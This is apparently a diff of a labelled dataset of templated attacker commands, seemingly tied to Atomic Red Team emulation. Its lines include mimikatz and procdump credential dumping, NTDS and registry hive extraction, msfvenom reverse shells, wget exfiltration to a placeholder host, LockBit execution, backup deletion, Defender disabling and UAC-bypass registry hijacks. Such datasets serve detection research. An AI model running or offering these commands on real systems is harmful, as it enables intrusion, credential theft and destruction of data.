@@ -25,36 +25,30 @@
 1	cmd.exe /c "SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\\${username} password=${password}"
 1	powershell -c "mstsc /v:${ip_address} /f"
 1	powershell -c "xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e"
-1	powershell -c "xcopy ${source_file_path} \\${ip_address}\${destination_file_path}"
-1	powershell -c "sync -avz ${source_file_path} ${destination_file_path}"
-1	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
-0	echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-0	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
-0	lockbit.exe -pass ${password}
-0	powershell -c "cipher.exe /w:C:"
-0	powershell -c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-0	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
-0	ntdsutil "ac i ntds" "ifm" "create full ${local_file_path}" q q
-0	mimikatz.exe "sekurlsa::minidump lsassdump.dmp" "sekurlsa::logonpasswords full" exit
-0	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	taskkill.exe /f /im ${process_name}
-0	echo User Domain: %USERDOMAIN%
-0	New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
-0	wget --post-file=${source_file_path} ${ip_address}:${port}
-0	Compress-Archive -Path ${source_file_path} -DestinationPath ${destination_file_path} -Force
-0	msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	whoami /all
-0	choco install 7zip
-0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
-0	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path} -Asynchronous
-0	lazagne.exe windows -mscache
-0	choco install -y putty
-0	sc stop WinDefend && sc config WinDefend start=disabled
-0	msfvenom -p cmd/unix/reverse_bash HOST=${ip_address} LPORT=${port} -f raw -o reverse.sh
-0	cmd.exe /c "lockbit.exe -pass ${password}"
-0	tar -cvzf archive.tar.gz ${source_directory}
-0	quser /SERVER:${computer_name}
-0	ssmtp ${username}@${domain} < mail.txt
-0	mimikatz.exe "sekurlsa::minidump lsassdump.dmp" "sekurlsa::logonpasswords full" exit
+0	procdump -accepteula -ma lsass.exe lsassdump.dmp
 0	net users
-0	powershell -c "Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse"
+0	cscript "${jscript}"
+0	cat email.txt | sendmail ${username}@${domain}
+0	msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	7z a ${destination_file_path} ${source_file_path} -p${password}
+0	7z a -p${password} ${destination_file_path} ${source_file_path}
+0	rm -f ${local_file_path}
+0	powershell -c "${command_to_execute}" > ${local_file_path}
+0	powershell -c "wbadmin delete systemstatebackup -keepVersions:0"
+0	cmd.exe /c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
+0	7z a -p${password} -mhe=on ${destination_file_path} ${source_file_path}
+0	compress ${source_file_path}
+0	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path} -Asynchronous
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "Atomic Red Team" /t REG_MULTI_SZ /d "${command_to_execute}" /f
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v 1 /d "${command_to_execute}"
+0	reg SAVE HKLM\SYSTYEM ${local_file_path}
+0	powershell -c "choco install -y 7zip"
+0	"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+0	choco install -y 7zip
+0	powershell -c "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+0	rm -f ${local_file_path}
+0	powershell -c "choco install -y putty"
+0	cmd.exe /c "echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	plink -ssh ${ip_address} -l ${username} -pw ${password}
